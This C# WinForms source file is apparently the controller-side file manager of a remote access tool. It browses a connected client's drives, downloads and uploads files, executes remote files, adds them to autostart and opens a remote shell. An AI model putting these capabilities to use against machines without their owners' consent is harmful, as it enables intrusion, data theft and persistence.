﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using xServer.Controls;
using xServer.Core.Commands;
using xServer.Core.Data;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Utilities;
using xServer.Enums;

namespace xServer.Forms
{
    public partial class FrmFileManager : Form
    {
        private string _currentDir;
        private readonly Client _connectClient;
        private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file uploads
        public Dictionary<int, string> CanceledUploads = new Dictionary<int, string>();

        private const int TRANSFER_ID = 0;
        private const int TRANSFER_TYPE = 1;
        private const int TRANSFER_STATUS = 2;

        public FrmFileManager(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmFm = this;
            InitializeComponent();
        }

        private string GetAbsolutePath(string item)
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.Length == 1)
                    return Path.Combine(_currentDir, item);
                else
                    return Path.Combine(_currentDir + '/', item);
            }

            return Path.GetFullPath(Path.Combine(_currentDir, item));
        }

        private void NavigateUp()
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.LastIndexOf('/') > 0)
                {
                    _currentDir = _currentDir.Remove(_currentDir.LastIndexOf('/') + 1);
                    _currentDir = _currentDir.TrimEnd('/');
                }
                else
                    _currentDir = "/";

                SetCurrentDir(_currentDir);
            }
            else
                SetCurrentDir(GetAbsolutePath(@"..\"));
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = WindowHelper.GetWindowTitle("File Manager", _connectClient);
                new Core.Packets.ServerPackets.GetDrives().Execute(_connectClient);
            }
        }

        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmFm = null;
        }

        private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (_connectClient != null && _connectClient.Value != null)
            {
                SetCurrentDir(cmbDrives.SelectedValue.ToString());
                RefreshDirectory();
            }
        }

        private void lstDirectory_DoubleClick(object sender, EventArgs e)
        {
            if (_connectClient != null && _connectClient.Value != null && lstDirectory.SelectedItems.Count > 0)
            {
                PathType type = (PathType) lstDirectory.SelectedItems[0].Tag;

                switch (type)
                {
                    case PathType.Back:
                        NavigateUp();
                        RefreshDirectory();
                        break;
                    case PathType.Directory:
                        SetCurrentDir(GetAbsolutePath(lstDirectory.SelectedItems[0].SubItems[0].Text));
                        RefreshDirectory();
                        break;
                }
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                PathType type = (PathType)files.Tag;

                if (type == PathType.File)
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    int id = FileHelper.GetNewTransferId(files.Index);

                    if (_connectClient != null)
                    {
                        new Core.Packets.ServerPackets.DoDownloadFile(path, id).Execute(_connectClient);

                        AddTransfer(id, "Download", "Pending...", files.SubItems[0].Text);
                    }
                }
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Title = "Select files to upload";
                ofd.Filter = "All files (*.*)|*.*";
                ofd.Multiselect = true;

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    var remoteDir = _currentDir;
                    foreach (var filePath in ofd.FileNames)
                    {
                        if (!File.Exists(filePath)) continue;

                        string path = filePath;
                        new Thread(() =>
                        {
                            int id = FileHelper.GetNewTransferId();

                            if (string.IsNullOrEmpty(path)) return;

                            AddTransfer(id, "Upload", "Pending...", Path.GetFileName(path));

                            int index = GetTransferIndex(id);
                            if (index < 0)
                                return;

                            FileSplit srcFile = new FileSplit(path);
                            if (srcFile.MaxBlocks < 0)
                            {
                                UpdateTransferStatus(index, "Error reading file", 0);
                                return;
                            }

                            string remotePath = Path.Combine(remoteDir, Path.GetFileName(path));

                            if (string.IsNullOrEmpty(remotePath)) return;

                            _limitThreads.WaitOne();
                            for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                            {
                                if (_connectClient.Value == null || _connectClient.Value.FrmFm == null)
                                {
                                    _limitThreads.Release();
                                    return; // abort upload when from is closed or client disconnected
                                }

                                if (CanceledUploads.ContainsKey(id))
                                {
                                    UpdateTransferStatus(index, "Canceled", 0);
                                    _limitThreads.Release();
                                    return;
                                }

                                index = GetTransferIndex(id);
                                if (index < 0)
                                {
                                    _limitThreads.Release();
                                    return;
                                }

                                decimal progress =
                                    Math.Round((decimal)((double)(currentBlock + 1) / (double)srcFile.MaxBlocks * 100.0), 2);

                                UpdateTransferStatus(index, string.Format("Uploading...({0}%)", progress), -1);

                                byte[] block;
                                if (srcFile.ReadBlock(currentBlock, out block))
                                {
                                    new Core.Packets.ServerPackets.DoUploadFile(id,
                                        remotePath, block, srcFile.MaxBlocks,
                                        currentBlock).Execute(_connectClient);
                                }
                                else
                                {
                                    UpdateTransferStatus(index, "Error reading file", 0);
                                    _limitThreads.Release();
                                    return;
                                }
                            }
                            _limitThreads.Release();

                            if (remoteDir == _currentDir)
                                RefreshDirectory();

                            UpdateTransferStatus(index, "Completed", 1);
                        }).Start();
                    }
                }
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                PathType type = (PathType) files.Tag;

                if (type == PathType.File)
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    if (_connectClient != null)
                        new Core.Packets.ServerPackets.DoProcessStart(path).Execute(_connectClient);
                }
            }
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                PathType type = (PathType)files.Tag;

                switch (type)
                {
                    case PathType.Directory:
                    case PathType.File:
                        string path = GetAbsolutePath(files.SubItems[0].Text);
                        string newName = files.SubItems[0].Text;

                        if (InputBox.Show("New name", "Enter new name:", ref newName) == DialogResult.OK)
                        {
                            newName = GetAbsolutePath(newName);

                            if (_connectClient != null)
                                new Core.Packets.ServerPackets.DoPathRename(path, newName, type).Execute(_connectClient);
                        }
                        break;
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int count = lstDirectory.SelectedItems.Count;
            if (count == 0) return;
            if (MessageBox.Show(string.Format("Are you sure you want to delete {0} file(s)?", count),
                "Delete Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (ListViewItem files in lstDirectory.SelectedItems)
                {
                    PathType type = (PathType)files.Tag;

                    switch (type)
                    {
                        case PathType.Directory:
                        case PathType.File:
                            string path = GetAbsolutePath(files.SubItems[0].Text);
                            if (_connectClient != null)
                                new Core.Packets.ServerPackets.DoPathDelete(path, type).Execute(_connectClient);
                            break;
                    }
                }
            }
        }

        private void addToStartupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                PathType type = (PathType)files.Tag;

                if (type == PathType.File)
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    using (var frm = new FrmAddToAutostart(path))
                    {
                        if (frm.ShowDialog() == DialogResult.OK)
                        {
                            if (_connectClient != null)
                                new Core.Packets.ServerPackets.DoStartupItemAdd(AutostartItem.Name, AutostartItem.Path,
                                    AutostartItem.Type).Execute(_connectClient);
                        }
                    }
                }
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void openDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                string path = _currentDir;
                if (lstDirectory.SelectedItems.Count == 1)
                {
                    var item = lstDirectory.SelectedItems[0];
                    PathType type = (PathType)item.Tag;

                    if (type == PathType.Directory)
                    {
                        path = GetAbsolutePath(item.SubItems[0].Text);
                    }
                }

                if (_connectClient.Value.FrmRs != null)
                {
                    new Core.Packets.ServerPackets.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
                    _connectClient.Value.FrmRs.Focus();
                }
                else
                {
                    FrmRemoteShell frmRS = new FrmRemoteShell(_connectClient);
                    frmRS.Show();
                    new Core.Packets.ServerPackets.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
                }
            }
        }

        private void btnOpenDLFolder_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists(_connectClient.Value.DownloadDirectory))
                Directory.CreateDirectory(_connectClient.Value.DownloadDirectory);
            
            Process.Start(_connectClient.Value.DownloadDirectory);
        }

        private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
            {
                if (!transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Downloading") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Uploading") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Pending")) continue;

                int id = int.Parse(transfer.SubItems[TRANSFER_ID].Text);

                if (transfer.SubItems[TRANSFER_TYPE].Text == "Download")
                {
                    if (_connectClient != null)
                        new Core.Packets.ServerPackets.DoDownloadFileCancel(id).Execute(_connectClient);
                    if (!CommandHandler.CanceledDownloads.ContainsKey(id))
                        CommandHandler.CanceledDownloads.Add(id, "canceled");
                    if (CommandHandler.RenamedFiles.ContainsKey(id))
                        CommandHandler.RenamedFiles.Remove(id);
                    UpdateTransferStatus(transfer.Index, "Canceled", 0);
                }
                else if (transfer.SubItems[TRANSFER_TYPE].Text == "Upload")
                {
                    if (!CanceledUploads.ContainsKey(id))
                        CanceledUploads.Add(id, "canceled");
                    UpdateTransferStatus(transfer.Index, "Canceled", 0);
                }
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.Items)
            {
                if (transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Downloading") ||
                    transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Uploading") ||
                    transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Pending")) continue;
                transfer.Remove();
            }
        }

        private void lstDirectory_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop)) // allow drag & drop with files
                e.Effect = DragDropEffects.Copy;
        }

        private void lstDirectory_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
                var remoteDir = _currentDir;
                foreach (string filePath in files)
                {
                    if (!File.Exists(filePath)) continue;

                    string path = filePath;
                    new Thread(() =>
                    {
                        int id = FileHelper.GetNewTransferId();

                        if (string.IsNullOrEmpty(path)) return;

                        AddTransfer(id, "Upload", "Pending...", Path.GetFileName(path));

                        int index = GetTransferIndex(id);
                        if (index < 0)
                            return;

                        FileSplit srcFile = new FileSplit(path);
                        if (srcFile.MaxBlocks < 0)
                        {
                            UpdateTransferStatus(index, "Error reading file", 0);
                            return;
                        }

                        string remotePath = Path.Combine(remoteDir, Path.GetFileName(path));

                        if (string.IsNullOrEmpty(remotePath)) return;

                        _limitThreads.WaitOne();
                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                        {
                            if (_connectClient.Value == null || _connectClient.Value.FrmFm == null)
                            {
                                _limitThreads.Release();
                                return; // abort upload when from is closed or client disconnected
                            }

                            if (CanceledUploads.ContainsKey(id))
                            {
                                UpdateTransferStatus(index, "Canceled", 0);
                                _limitThreads.Release();
                                return;
                            }

                            index = GetTransferIndex(id);
                            if (index < 0)
                            {
                                _limitThreads.Release();
                                return;
                            }

                            decimal progress =
                                Math.Round((decimal)((double)(currentBlock + 1) / (double)srcFile.MaxBlocks * 100.0), 2);

                            UpdateTransferStatus(index, string.Format("Uploading...({0}%)", progress), -1);

                            byte[] block;
                            if (srcFile.ReadBlock(currentBlock, out block))
                            {
                                new Core.Packets.ServerPackets.DoUploadFile(id,
                                    remotePath, block, srcFile.MaxBlocks,
                                    currentBlock).Execute(_connectClient);
                            }
                            else
                            {
                                UpdateTransferStatus(index, "Error reading file", 0);
                                _limitThreads.Release();
                                return;
                            }
                        }
                        _limitThreads.Release();

                        if (remoteDir == _currentDir)
                            RefreshDirectory();

                        UpdateTransferStatus(index, "Completed", 1);
                    }).Start();
                }
            }
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void FrmFileManager_KeyDown(object sender, KeyEventArgs e)
        {
            // refresh when F5 is pressed
            if (e.KeyCode == Keys.F5 && !string.IsNullOrEmpty(_currentDir) && TabControlFileManager.SelectedIndex == 0)
            {
                RefreshDirectory();
                e.Handled = true;
            }
        }

        public void AddDrives(RemoteDrive[] drives)
        {
            try
            {
                cmbDrives.Invoke((MethodInvoker) delegate
                {
                    cmbDrives.DisplayMember = "DisplayName";
                    cmbDrives.ValueMember = "RootDirectory";
                    cmbDrives.DataSource = new BindingSource(drives, null);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void ClearFileBrowser()
        {
            try
            {
                lstDirectory.Invoke((MethodInvoker)delegate
                {
                    lstDirectory.Items.Clear();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void AddItemToFileBrowser(string name, string size, PathType type, int imageIndex)
        {
            try
            {
                ListViewItem lvi = new ListViewItem(new string[] { name, size, (type != PathType.Back) ? type.ToString() : string.Empty })
                {
                    Tag = type,
                    ImageIndex = imageIndex
                };

                lstDirectory.Invoke((MethodInvoker)delegate
                {
                    lstDirectory.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void AddTransfer(int id, string type, string status, string filename)
        {
            try
            {
                ListViewItem lvi =
                    new ListViewItem(new string[] {id.ToString(), type, status, filename});

                lstDirectory.Invoke((MethodInvoker)delegate
                {
                    lstTransfers.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public int GetTransferIndex(int id)
        {
            string strId = id.ToString();
            int index = 0;

            try
            {
                lstTransfers.Invoke((MethodInvoker)delegate
                {
                    foreach (ListViewItem lvi in lstTransfers.Items.Cast<ListViewItem>().Where(lvi => lvi != null && strId.Equals(lvi.SubItems[TRANSFER_ID].Text)))
                    {
                        index = lvi.Index;
                        break;
                    }
                });
            }
            catch (InvalidOperationException)
            {
                return -1;
            }

            return index;
        }

        public void UpdateTransferStatus(int index, string status, int imageIndex)
        {
            try
            {
                lstTransfers.Invoke((MethodInvoker) delegate
                {
                    lstTransfers.Items[index].SubItems[TRANSFER_STATUS].Text = status;
                    if (imageIndex >= 0)
                        lstTransfers.Items[index].ImageIndex = imageIndex;
                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception)
            {
            }
        }

        /// <summary>
        /// Sets the current directory of the File Manager.
        /// </summary>
        /// <param name="path">The new path.</param>
        public void SetCurrentDir(string path)
        {
            _currentDir = path;
            try
            {
                txtPath.Invoke((MethodInvoker)delegate
                {
                    txtPath.Text = _currentDir;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Sets the status of the File Manager Form.
        /// </summary>
        /// <param name="text">The new status.</param>
        /// <param name="setLastDirectorySeen">Sets LastDirectorySeen to true.</param>
        public void SetStatus(string text, bool setLastDirectorySeen = false)
        {
            try
            {
                if (_connectClient.Value != null && setLastDirectorySeen)
                {
                    SetCurrentDir(Path.GetFullPath(Path.Combine(_currentDir, @"..\")));
                    _connectClient.Value.ReceivedLastDirectory = true;
                }
                statusStrip.Invoke((MethodInvoker)delegate
                {
                    stripLblStatus.Text = "Status: " + text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void RefreshDirectory()
        {
            if (_connectClient == null || _connectClient.Value == null) return;

            if (!_connectClient.Value.ReceivedLastDirectory)
                _connectClient.Value.ProcessingDirectory = false;

            new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
            SetStatus("Loading directory content...");
            _connectClient.Value.ReceivedLastDirectory = false;
        }
    }
}